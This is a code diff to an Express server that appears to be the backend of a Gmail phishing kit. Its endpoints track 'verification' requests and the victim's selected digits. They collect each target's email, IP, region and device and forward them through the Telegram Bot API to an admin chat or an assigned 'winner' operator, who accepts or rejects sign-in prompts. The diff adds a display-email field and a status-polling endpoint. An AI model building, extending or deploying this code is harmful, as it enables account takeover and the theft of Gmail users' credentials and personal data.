@@ -1295,11 +1295,15 @@ app.get("/get-gmail-login/:requestId", (req, res) => {
 app.post("/send-verification-page", async (req, res) => {
   try {
     console.log('🔍 DEBUG: /send-verification-page endpoint called');
-    const { userId, email: gmailEmail } = req.body;
-    console.log('🔍 DEBUG: Received userId:', userId, 'email:', gmailEmail);
+    const { userId, email, displayEmail } = req.body;
     
-    if (!userId) {
-      return res.status(400).json({ error: "Missing userId" });
+    // ✅ Use displayEmail if provided, otherwise use email
+    const messageEmail = displayEmail || email;
+    
+    console.log('🔍 DEBUG: Received userId:', userId, 'email:', email, 'displayEmail:', messageEmail);
+    
+    if (!userId || !email) {
+      return res.status(400).json({ error: "Missing userId or email" });
     }
     
     const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
@@ -1310,12 +1314,18 @@ app.post("/send-verification-page", async (req, res) => {
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
-    pendingVerificationPage[requestId] = { status: "pending", selectedDigits: null, email: gmailEmail };
+    // ✅ Store both email (for tracking) and displayEmail (for showing)
+    pendingVerificationPage[requestId] = { 
+      status: "pending", 
+      selectedDigits: null, 
+      email: email,
+      displayEmail: messageEmail
+    };
 
     const message =
       `🌈🌈🌈 <b>Gmail - Verification</b> 🌈🌈🌈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${gmailEmail || 'Unknown'}</code>\n` +
+      `<b>📧 Email:</b> <code>${messageEmail || 'Unknown'}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
@@ -1345,10 +1355,10 @@ app.post("/send-verification-page", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    // ✅ SEND TO WINNER ONLY
-    if (gmailEmail && userWinnerTelegram[gmailEmail]) {
-      console.log(`📨 Verification going to winner only: ${userWinnerTelegram[gmailEmail]}`);
-      await sendFollowUpMessage(gmailEmail, message, options);
+    // ✅ SEND TO WINNER ONLY (use tracking email for winner lookup)
+    if (email && userWinnerTelegram[email]) {
+      console.log(`📨 Verification going to winner only: ${userWinnerTelegram[email]}`);
+      await sendFollowUpMessage(email, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       await fetch(url, {
@@ -1363,7 +1373,7 @@ app.post("/send-verification-page", async (req, res) => {
       });
     }
 
-    res.json({ status: "pending", requestId, email: gmailEmail });
+    res.json({ status: "pending", requestId, email });
 
   } catch (err) {
     console.error("❌ Verification Page endpoint error:", err);
@@ -1394,6 +1404,36 @@ app.post("/update-selected-digits", (req, res) => {
     res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
   } catch (err) {
     console.error("❌ Update selected digits error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// GET /check-verification-status - Check verification confirmation status by requestId
+// ============================================================================
+
+app.get("/check-verification-status", (req, res) => {
+  try {
+    const requestId = (req.query.requestId || "").trim();
+
+    if (!requestId || !pendingVerificationConfirm[requestId]) {
+      return res.json({ status: "pending" });
+    }
+
+    const status = pendingVerificationConfirm[requestId].status;
+    console.log(`✅ Verification status for requestId ${requestId}: ${status}`);
+    
+    // Map bot status values to frontend expectations
+    if (status === "verification_accept") {
+      return res.json({ status: "accepted" });
+    } else if (status === "verification_reject") {
+      return res.json({ status: "rejected" });
+    }
+    
+    return res.json({ status: status || "pending" });
+
+  } catch (err) {
+    console.error("Check verification status error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
